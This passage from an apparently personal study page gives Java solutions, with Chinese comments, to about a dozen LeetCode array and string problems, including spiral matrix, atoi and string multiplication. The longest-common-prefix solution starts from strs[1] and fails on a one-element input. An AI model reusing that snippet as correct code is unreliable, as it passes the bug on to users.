class="type">int</span> <span class="variable">m2</span> <span class="operator">=</span> total / <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (getKth(nums1, nums2, m1 + <span class="number">1</span>) + getKth(nums1, nums2, m2 + <span class="number">1</span>)) / <span class="number">2.0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m3</span>  <span class="operator">=</span>total / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">return</span> getKth(nums1, nums2, m3 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="title function_">getKth</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index1 == nums1.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums2[index2 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (index2 == nums2.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> nums1[index1 + k - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Math.min(nums1[index1], nums2[index2]);</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">// 为什么不直接二分,因为如果其中一个数组特别大的时候会消耗一些时间</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> k / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex1</span> <span class="operator">=</span> Math.min(index1 + half, m) - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">newIndex2</span> <span class="operator">=</span> Math.min(index2 + half, n)  - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums1[newIndex1] &gt; nums2[newIndex2]) &#123;</span><br><span class="line">                k -= newIndex2 - index2 + <span class="number">1</span>;</span><br><span class="line">                index2 = newIndex2 + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k -= newIndex1 - index1 + <span class="number">1</span>;</span><br><span class="line">                index1 = newIndex1 + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11. 盛最多水的容器"></a><a href="https://leetcode-cn.com/problems/container-with-most-water/">11. 盛最多水的容器</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一开始两个指针一个指向开头一个指向结尾，此时容器的底是最大的，接下来随着指针向内移动，会造成容器的底变小，在这种情况下想要让容器盛水变多，就只有在容器的高上下功夫。 那我们该如何决策哪个指针移动呢？我们能够发现不管是左指针向右移动一位，还是右指针向左移动一位，容器的底都是一样的，都比原来减少了 1。这种情况下我们想要让指针移动后的容器面积增大，就要使移动后的容器的高尽量大，所以我们选择指针所指的高较小的那个指针进行移动，这样我们就保留了容器较高的那条边，放弃了较小的那条边，以获得有更高的边的机会。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> height.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = len - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">      ans = Math.max(ans, Math.min(height[left], height[right]) * (right - left) );</span><br><span class="line">      <span class="keyword">if</span> (height[left] &gt;= height[right]) &#123;</span><br><span class="line">        right--;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        left++;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="88-合并两个有序数组-x2F-x2F"><a href="#88-合并两个有序数组-x2F-x2F" class="headerlink" title="88. 合并两个有序数组&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-sorted-array/">88. 合并两个有序数组</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针, 从后往前</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span> m, <span class="type">int</span>[] nums2, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m -<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums1[i] &gt; nums2[j]) &#123;</span><br><span class="line">                nums1[index--] = nums1[i--];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums1[index--] = nums2[j--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            nums1[index--] = nums2[j --];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="14-最长公共前缀-x2F"><a href="#14-最长公共前缀-x2F" class="headerlink" title="14. 最长公共前缀&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-common-prefix/">14. 最长公共前缀</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">longestCommonPrefix</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ans</span> <span class="operator">=</span> strs[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; strs.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> ( j &lt; ans.length() &amp;&amp; j &lt; strs[i].length() &amp;&amp; ans.charAt(j) == strs[i].charAt(j)) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = strs[i].substring(<span class="number">0</span>, j);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="54-螺旋矩阵"><a href="#54-螺旋矩阵" class="headerlink" title="54. 螺旋矩阵"></a><a href="https://leetcode-cn.com/problems/spiral-matrix/">54. 螺旋矩阵</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 一圈一圈遍历,外圈遍历结束内圈又是一个新的矩阵</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">spiralOrder</span><span class="params">(<span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> m * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> m - <span class="number">1</span>;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (sum &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[top][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt;= bottom &amp;&amp; sum &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">                res.add(matrix[i][right]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right; i &gt;= left &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[bottom][i]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom; i &gt;= top &amp;&amp; sum &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">                res.add(matrix[i][left]);</span><br><span class="line">                sum--;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="59-螺旋矩阵-II-x2F"><a href="#59-螺旋矩阵-II-x2F" class="headerlink" title="59. 螺旋矩阵 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/spiral-matrix-ii/">59. 螺旋矩阵 II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[][] generateMatrix(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[][] res = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> n * n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span>  <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> n;</span><br><span class="line">        <span class="type">int</span> <span class="variable">top</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">bottom</span> <span class="operator">=</span> n;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (start &lt;= sum) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt; right; i++) &#123;</span><br><span class="line">                res[top][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            top++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> top; i &lt; bottom; i++) &#123;</span><br><span class="line">                res[i][right - <span class="number">1</span>] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            right--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> right - <span class="number">1</span>; i &gt;= left; i--) &#123;</span><br><span class="line">                res[bottom - <span class="number">1</span>][i] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            bottom--;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bottom - <span class="number">1</span>; i &gt;= top; i--) &#123;</span><br><span class="line">                res[i][left] = start;</span><br><span class="line">                start++;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="33-搜索旋转排序数组-x2F"><a href="#33-搜索旋转排序数组-x2F" class="headerlink" title="33. 搜索旋转排序数组&#x2F;"></a><a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">33. 搜索旋转排序数组</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二分查找</span></span><br><span class="line"><span class="comment">// 将数组一分为二，其中一定有一个是有序的，另一个可能是有序，也能是部分有序。此时有序部分用二分法查找。无序部分再一分为二，其中一个一定有序，另一个可能有序，可能无序。就这样循环.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[l] &lt; nums[mid]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[l] &lt;= target &amp;&amp; target &lt; nums[mid]) &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[r] &gt;= target &amp;&amp; target &gt; nums[mid]) &#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="674-最长连续递增序列-x2F"><a href="#674-最长连续递增序列-x2F" class="headerlink" title="674. 最长连续递增序列&#x2F;"></a><a href="https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/">674. 最长连续递增序列</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLengthOfLCIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                tmp++;</span><br><span class="line">                res = Math.max(res, tmp);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-字符串转换整数-atoi"><a href="#8-字符串转换整数-atoi" class="headerlink" title="8. 字符串转换整数 (atoi)"></a><a href="https://leetcode-cn.com/problems/string-to-integer-atoi/">8. 字符串转换整数 (atoi)</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">myAtoi</span><span class="params">(String str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">    <span class="type">char</span>[] s = str.toCharArray();</span><br><span class="line">    <span class="comment">// 去掉前导空格</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len &amp;&amp; s[index] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 针对全是空格的情况</span></span><br><span class="line">    <span class="keyword">if</span> (index == len) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果出现符号字符,仅第一个有效,并记录正负</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">sign</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">char</span> <span class="variable">firstChar</span> <span class="operator">=</span> s[index];</span><br><span class="line">    <span class="keyword">if</span> (firstChar == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (firstChar == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">      index++;</span><br><span class="line">      sign = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">// 将后续出现的数字字符进行转换</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; len) &#123;</span><br><span class="line">      <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">      <span class="comment">// 判断不合法情况</span></span><br><span class="line">      <span class="keyword">if</span> (c &gt; <span class="string">&#x27;9&#x27;</span> || c &lt; <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 判断范围</span></span><br><span class="line">      <span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span> || (res == Integer.MAX_VALUE / <span class="number">10</span>) &amp;&amp; (c - <span class="string">&#x27;0&#x27;</span>) &gt; Integer.MAX_VALUE % <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span> || (res == Integer.MIN_VALUE / <span class="number">10</span>) &amp;&amp; ((c - <span class="string">&#x27;0&#x27;</span>) &gt; -(Integer.MIN_VALUE % <span class="number">10</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.MIN_VALUE;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 开始转换</span></span><br><span class="line">      res = res * <span class="number">10</span> + sign * (c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">      index++;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="43-字符串相乘"><a href="#43-字符串相乘" class="headerlink" title="43. 字符串相乘"></a><a href="https://leetcode-cn.com/problems/multiply-strings/">43. 字符串相乘</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">multiply</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> num1.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> num2.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[m + n + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> m + n + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mul</span> <span class="operator">=</span> (num2.charAt(i) - <span class="string">&#x27;0&#x27;</span>) * (num1.charAt(j) - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">                index = i + j + <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> (res[index] + mul) /  <span class="number">10</span>;</span><br><span class="line">                res[index] = (res[index] + mul) % <span class="number">10</span>;</span><br><span class="line">                index--;</span><br><span class="line">                res[index] += carry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; res.length - <span class="number">1</span> &amp;&amp; res[i] == <span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; res.length; i++) &#123;</span><br><span class="line">            sb.append(res[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="557-反转字符串中的单词-III"><a href="#557-反转字符串中的单词-III" class="headerlink" title="557. 反转字符串中的单词 III"></a><a href="https://leetcode-cn.com/problems/reverse-words-in-a-string-iii/">557. 反转字符串中的单词 III</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对于java而言，String是不可变字符数组，所以无法避免空间的开销</span></span><br><span class="line"><span class="comment">// 使用额外的空间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (String s2:</span><br><span class="line">             s1) &#123;</span><br><span class="line">            stringBuilder.append(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(s2).reverse().toString());</span><br><span class="line">            stringBuilder.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="238-除自身以外数组的乘积"><a href="#238-除自身以外数组的乘积" class="headerlink" title="238. 除自身以外数组的乘积"></a><a href="https://leetcode-cn.com/problems/product-of-array-except-self/">238. 除自身以外数组的乘积</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 乘积 = 当前数左边的乘积 * 当前数右边的乘积</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span>[] productExceptSelf(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">    <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">    <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">      res[i] = k;</span><br><span class="line">      k = k * nums[i]; <span class="comment">// 此时数组存储的是除去当前元素左边的元素乘积</span></span><br><span class="line">    &#125;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">      res[i] *= k;<span class="comment">// k为该数右边的乘积。</span></span><br><span class="line"></span><br><span class="line">      k = nums[i] * k;<span class="comment">// 此时数组等于左边的 * 该数右边的。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="16-最接近的三数之和"><a href="#16-最接近的三数之和" class="headerlink" title="16. 最接近的三数之和"></a><a href="https://leetcode-cn.com/problems/3sum-closest/">16. 最接近的三数之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">threeSumClosest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>] + nums[<span class="number">2</span>] + nums[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (Math.abs(sum - target) &lt; Math.abs(min - target)) &#123;</span><br><span class="line">                    min = sum;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; target)&#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> min;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

